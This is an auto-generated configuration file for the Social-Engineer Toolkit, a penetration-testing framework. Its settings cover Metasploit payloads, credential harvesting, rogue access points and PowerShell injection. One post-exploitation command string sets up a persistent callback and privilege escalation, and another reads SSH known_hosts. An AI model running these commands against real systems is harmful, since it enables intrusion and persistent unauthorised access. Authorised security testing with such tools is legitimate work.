#!/usr/bin/python

#######################################################################
##                    DO NOT MODIFY THIS FILE                        ##
#######################################################################
#  This file is generated by a routine inside SET, for use by SET.    #
#                                                                     # 
#  Settings should be modified in the set_config file, and then       #
#  SET updated using the 'Update SET Configuration' menu item in      #
#  the main menu. This file will be updated with the new settings.    #
#                                                                     #
#  set_config.py generated: 2012-07-22 13:45:57.001649                #
#                                                                     #
#######################################################################
CONFIG_DATE='2012-07-22 13:45:57.001649'
METASPLOIT_PATH="/opt/metasploit/msf3"
METASPLOIT_DATABASE="postgresql"
ENCOUNT=4
AUTO_MIGRATE=True
CUSTOM_EXE="legit.binary"
BACKDOOR_EXECUTION=True
METERPRETER_MULTI_SCRIPT=False
LINUX_METERPRETER_MULTI_SCRIPT=False
METERPRETER_MULTI_COMMANDS="run persistence -r 192.168.1.5 -p 21 -i 300 -X -A;getsystem"
LINUX_METERPRETER_MULTI_COMMANDS="uname;id;cat ~/.ssh/known_hosts"
METASPLOIT_IFRAME_PORT=8080
ETTERCAP=True
ETTERCAP_PATH="/usr/share/ettercap"
ETTERCAP_DSNIFF_INTERFACE="eth0"
DSNIFF=False
AUTO_DETECT=False
SENDMAIL=False
EMAIL_PROVIDER="GMAIL"
WEBATTACK_EMAIL=False
MLITM_PORT=80
APACHE_SERVER=False
APACHE_DIRECTORY="/var/www"
WEB_PORT=80
SELF_SIGNED_APPLET=False
JAVA_ID_PARAM="Secure Java Applet"
JAVA_REPEATER=False
JAVA_TIME="200"
WEBATTACK_SSL=False
SELF_SIGNED_CERT=False
PEM_CLIENT="/root/newcert.pem"
PEM_SERVER="/root/newreq.pem"
WEBJACKING_TIME=2000
COMMAND_CENTER_INTERFACE="127.0.0.1"
COMMAND_CENTER_PORT=44444
SET_INTERACTIVE_SHELL=True
TERMINAL="SOLO"
DIGITAL_SIGNATURE_STEAL=True
UPX_ENCODE=True
UPX_PATH="/usr/bin/upx"
AUTO_REDIRECT=False
HARVESTER_REDIRECT=False
HARVESTER_URL="http://thishasnotbeenset"
UNC_EMBED=False
ACCESS_POINT_SSID="linksys"
AIRBASE_NG_PATH="/usr/local/sbin/airbase-ng"
DNSSPOOF_PATH="/usr/local/sbin/dnsspoof"
AP_CHANNEL=9
POWERSHELL_INJECTION=True
POWERSHELL_VERBOSE=False
WEB_PROFILER=False
OSX_REVERSE_PORT=8080
LINUX_REVERSE_PORT=8081
USER_AGENT_STRING="Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
SET_SHELL_STAGER=False
AUTOMATIC_LISTENER=True
METASPLOIT_MODE=True
DEPLOY_BINARIES="YES"
